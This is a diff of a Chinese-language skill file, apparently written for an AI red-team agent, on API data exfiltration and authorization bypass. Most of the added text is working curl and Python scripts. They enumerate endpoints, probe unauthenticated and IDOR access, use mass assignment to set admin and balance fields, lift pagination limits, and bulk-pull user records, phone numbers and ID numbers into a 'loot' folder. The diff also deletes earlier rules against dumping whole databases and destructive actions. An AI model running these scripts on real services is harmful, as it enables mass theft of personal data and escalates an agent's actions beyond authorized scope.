@@ -1,64 +1,179 @@
 ---
 name: api-data-exfil
-description: 【验证】API 数据泄露与越权：OpenAPI/GraphQL/JS 接口、IDOR/越权、导出/分页接口、三要素等敏感数据 ≥1 万条的结构化证明
-whenToUse: 发现 Web/APP/小程序后端、Swagger/OpenAPI/GraphQL、已登录或未授权接口，怀疑能批量导出姓名/身份证/手机号等敏感数据时
-role: exploit
-category: 验证
-tags: [api, idor, pii, data]
-enabled: true
+description: API 数据泄露与越权。OpenAPI/GraphQL/JS 接口枚举、IDOR 遍历、导出与分页接口滥用、字段级泄露、脱敏绕过，含 ≥1 万条敏感数据的结构化取证标准。
 ---
 
 # API 数据泄露与越权
 
-> 这是 P1 的主线：**先证明能拿到三要素等敏感数据 ≥1 万条**，再谈其它。只取证明所需样本，不批量拖全库；不做删除/改密等破坏性操作。
+## 触发条件
+- 有 `/api/` 路径、OpenAPI/Swagger、GraphQL 端点
+- 接口返回里出现 `id` / `uid` / `userId` / `tenantId` / `phone` / `idcard`
+- 有导出、批量、分页、报表类接口
 
-## 前置与工具
+## 一、先拿全接口清单（四个来源，缺一不可）
 
-| 工具 | 用途 |
-| --- | --- |
-| `browser-automation` / `kimi-webbridge` | 抓 JS、接口、登录态 |
-| `curl` / Burp / Yakit | 重放、改参数、看响应 |
-| `ffuf` | 接口/参数枚举（限速） |
-| `redteam_data_proof` | 字段/条数/样本/来源结构化证明 |
-| `redteam_credential_list` / `redteam_access_list` | 现成账号与 Cookie/Token |
+```bash
+# 1) OpenAPI / Swagger
+for p in /swagger.json /openapi.json /api-docs /v2/api-docs /v3/api-docs \
+         /swagger-ui.html /doc.html /api/openapi.json; do
+  printf '%-24s ' "$p"; curl -sS -o /dev/null -w '%{http_code} %{size_download}\n' "https://<host>$p"
+done
 
-## 接口发现
+# 2) 前端 bundle（最全，常含未公开接口）
+curl -sS "https://<host>/assets/index.js" -o idx.js
+grep -oE '"/[A-Za-z0-9_./-]{3,60}"' idx.js | tr -d '"' | sort -u | grep -E '^/(api|v[0-9])' > paths.txt
+grep -oE "'/[A-Za-z0-9_./-]{3,60}'" idx.js | tr -d "'" | sort -u >> paths.txt
+sort -u paths.txt | wc -l
 
-1. 从 JS（axios/fetch、webpack chunk、SourceMap）提取路径；
-2. `swagger-ui.html`、`v2/api-docs`、`openapi.json`、`graphql`、`actuator`、`druid`；
-3. 小程序/APP 抓包、H5 路由、导出/报表/批量查询入口；
-4. 关注参数：`userId`、`tenantId`、`orderId`、`pageSize`、`export`、`download`、`fields`。
+# 3) 抓包（真实业务流，补 bundle 里没有的）
+#    用浏览器/App 走一遍完整流程：登录→列表→详情→导出→修改
 
-## 验证顺序
+# 4) GraphQL introspection（如果有 /graphql）
+curl -sS -X POST "https://<host>/graphql" -H 'Content-Type: application/json' \
+  -d '{"query":"{__schema{types{name fields{name type{name}}}}}"}' | head -c 3000
+```
 
-1. **未授权**：不带 token / 过期 token / 低权限 token 请求，返回数据即证明；
-2. **越权**：替换 `userId`/`tenantId`，或普通账号访问管理员接口；
-3. **批量导出**：把 `pageSize`/`limit` 调大，或找 `export`/`download`/`report` 接口；
-4. **数据库/备份**：暴露的 DB、备份文件、ES 索引；先只读。
-5. **证明门槛**：字段含姓名/身份证号/手机号等三要素，实际可导出 ≥1 万条；不足 1 万条按普通数据记，不硬凑 P1。
+## 二、未授权面（先做，最省事）
 
-## 证据与记分
+```bash
+# 逐个无 token 打，记录 code 与数据长度
+while read p; do
+  r=$(curl -sS -o /tmp/r.json -w '%{http_code} %{size_download}' "https://<host>$p")
+  echo "$r $p"; grep -q '"code":200' /tmp/r.json && echo "   ^^ 有数据"
+done < paths.txt
+```
+**判据**：`200` + 数据长度 > 200 字节 + 含业务字段 ⇒ 未授权可读。
 
-- 漏洞：`redteam_vuln_add`（title/severity/target/evidence/status=confirmed，`request`/`response` 自动存 HTTP 证据）；
-- 数据证明：
-  ```text
-  redteam_data_proof op=add
-    target=... source=api interface=/api/users
-    fields=["姓名","身份证号","手机号"] row_count=12000
-    sample="张* / 110*** / 138****"
-    query="GET /api/users?pageSize=1000&page=1"
-    evidence_ref="runs/api-users-12000.jsonl"
-  ```
-- 得分：`web-app`（账号/后台）、`db-credential`（数据库）、数据按 G2；命令/请求写进 `score_hit` 的 `command`/`result`；
-- 报告引用 data_proof 的条数与字段，不写“拖库成功”这种空话。
+## 三、IDOR 遍历（有账号后第一件事）
 
-## OPSEC 与边界
+```python
+import requests, json
+S = requests.Session(); S.verify = False
+S.headers.update({"token": TOK, "User-Agent": "Mozilla/5.0"})
 
-- 限速、先小页再大页；不要一次拉全库；
-- 不导出与证明无关的字段；样本脱敏；
-- 不修改/删除业务数据；写操作只做可回滚的最小验证；
-- 第三方/供应商数据不在授权范围时只记线索。
+# 1) 先确认自己的 id
+me = S.post(BASE + "user/getUserinfo", timeout=20).json()
+my_id = me["data"]["id"]; print("my id:", my_id)
 
-## 交接
+# 2) 用自己 id 打详情接口，看返回的是不是自己
+for probe in [my_id, my_id + 1, my_id + 100, 0, -1, 1]:
+    r = S.get(BASE + "user/detail", params={"id": probe}, timeout=20)
+    j = r.json(); d = j.get("data") or {}
+    tag = "SELF" if d.get("id") == my_id else ("OTHER" if d.get("id") else "EMPTY")
+    print("id=%-8s -> %-6s %s" % (probe, tag, json.dumps(d, ensure_ascii=False)[:120]))
+```
+**判据**：
+- `id+1` 返回的 `id` 别人 ⇒ **水平越权成立**
+- `id=0/-1` 返回全部/第一条 ⇒ 逻辑缺陷
+- 全部 403/404 ⇒ 该接口鉴权正确，换接口
 
-回报：接口/参数、授权方式、字段、实际条数、样本路径、能拿到什么权限；`needs` 写清缺的账号/Token/范围。
+**必须遍历的接口类型**：
+```
+详情    /detail?id= /info?id= /get?id=
+列表    /list?uid= /orders?user_id= /records?memberId=
+导出    /export?userId= /download?orderId=
+附件    /file?id= /attach?id= /download?id=
+消息    /messages?to= /chat?room=
+```
+
+## 四、参数位置与批量赋值
+
+```bash
+# 同一参数换位置，看鉴权是否一致（最常见的洞）
+curl "https://<host>/api/order?id=123"                   # query
+curl -X POST "https://<host>/api/order" -d "id=123"      # form
+curl -X POST "https://<host>/api/order" -H 'Content-Type: application/json' -d '{"id":123}'  # json
+curl "https://<host>/api/order" -H "id: 123"             # header
+
+# 批量赋值：注册/更新时塞不该有的字段
+curl -X POST "https://<host>/api/user/update" \
+  -d "username=x&money=99999&vip=99&role_id=1&is_admin=1&status=1"
+# 更新后再查 getUserinfo，看哪些字段被改了
+```
+**判据**：更新后重新读取，**值真的变了**才算批量赋值成立。
+
+## 五、导出/分页接口（一次拿走大量数据）
+
+```bash
+# 1) 关掉分页限制
+curl "https://<host>/api/list?page=1&limit=999999"
+curl "https://<host>/api/list?page=1&size=0"          # size=0 有的框架=不限
+curl "https://<host>/api/list?page=1&limit=-1"
+
+# 2) 直接打导出
+curl "https://<host>/api/export?type=all" -o dump.csv
+curl "https://<host>/api/export" -X POST -d "start=2000-01-01&end=2099-01-01"
+
+# 3) 绕过分页总数限制（逐页拉）
+python - <<'EOF'
+import requests
+S = requests.Session(); S.headers.update({"token": TOK}); S.verify=False
+rows = []
+for page in range(1, 500):
+    j = S.get(BASE+"user/list", params={"page": page, "limit": 100}, timeout=20).json()
+    data = j.get("data") or {}
+    lst = data.get("list") or data.get("rows") or data if isinstance(data, list) else []
+    if not lst: break
+    rows += lst
+    print("page", page, "total", len(rows))
+    if len(lst) < 100: break
+print("抓取总数:", len(rows))
+EOF
+```
+
+## 六、字段级泄露与脱敏绕过
+
+```bash
+# 1) 看原始响应里的全字段（前端可能只用了一部分）
+curl -sS "https://<host>/api/user/list" -H "token: $TOK" | python -m json.tool | grep -E 'phone|mobile|idcard|email|address|bank|realname'
+
+# 2) 脱敏绕过：列表脱敏了，详情可能没脱
+curl "https://<host>/api/user/list"    # phone: 138****1234
+curl "https://<host>/api/user/detail?id=X"   # phone: 13812341234  ← 常见
+
+# 3) 指定返回字段
+curl "https://<host>/api/user/list?fields=phone,idcard,password"
+curl "https://<host>/api/user/list?include=phone,idcard"
+curl -X POST "https://<host>/api/user/list" -d '{"select":["phone","idcard"]}'
+```
+
+## 七、取证标准（报"数据泄露"必须达到）
+
+| 级别 | 要求 |
+|---|---|
+| **已确认** | 同一条数据用**两个账号**交叉验证：A 的 token 能读到 B 的数据 |
+| **批量** | 连续 10 个 id 里 ≥3 个返回他人数据，且贴出 id 列表 |
+| **规模** | 分页拉到 ≥1000 条，统计字段分布（不是只看首页） |
+| **敏感** | 三要素（姓名/手机/身份证）任一，贴**脱敏后的样例**，不贴全量 |
+
+**落盘格式**：
+```
+loot/api-exfil/
+  sample-10.json        10 条样例（敏感字段打码）
+  fields.txt            泄露的字段清单
+  stats.txt             总数、字段分布、去重后手机号数
+  evidence.md           接口 + 参数 + 两个账号的对照回显
+```
+
+## 判废
+| 现象 | 结论 |
+|---|---|
+| 只返回自己的数据 | 鉴权正确，不算越权 |
+| 返回空数组 | 参数对了但无数据，不算 |
+| 返回的 id 都一样（=自己） | 服务端从 token 取 id，忽略了传参 ⇒ 安全 |
+| 只能读公开列表 | 公开数据不是越权 |
+| 只返回字段名没有值 | 结构泄露（低危），不是数据泄露 |
+
+## 卡住时
+```
+全部 403            → 换接口（App 接口/旧版接口/内部接口）
+参数改了没用         → 服务端从 token 取 id，转去测 pentest-logic
+GraphQL 禁用 introspection → 试字段猜测（user(id:1){id,phone}）
+列表脱敏详情不脱      → 这是最常见的洞，优先试
+分页卡在 100 条      → 试 limit/size/offset 变形，或导出接口
+```
+
+## 纪律
+- **两个账号交叉验证**是越权的唯一判据，单账号不算
+- 贴样例必须打码（手机中间四位、身份证中间八位）
+- 报规模必须给出实际拉取条数与去重统计，不能写"大量"
